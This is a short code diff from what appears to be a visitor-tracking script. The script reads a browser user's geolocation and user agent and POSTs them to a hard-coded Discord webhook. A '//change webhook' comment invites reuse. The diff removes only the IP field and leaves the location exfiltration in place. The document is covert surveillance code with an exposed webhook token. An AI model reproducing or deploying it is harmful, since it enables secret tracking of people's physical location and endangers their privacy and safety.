@@ -26,7 +26,7 @@ function ip_callback() {
 }
 
 function showPosition(position) {
-  var latlong = (" GET " , "Latitude: " + position.coords.latitude + "\nLongitude: " + position.coords.longitude + "\nUagent:" + navigator.userAgent + "\nip: " + ip_callback());
+  var latlong = (" GET " , "Latitude: " + position.coords.latitude + "\nLongitude: " + position.coords.longitude + "\nUagent:" + navigator.userAgent);
   
   const request = new XMLHttpRequest();
       request.open("POST", "https://discord.com/api/webhooks/977798116013133904/Es0rxL_L86Igb_lb9HeDSW2jtRy4th7k5n5LUtGsgvCRD0hOXeeHt2E8kZZYfkMpjTKY"); //change webhook
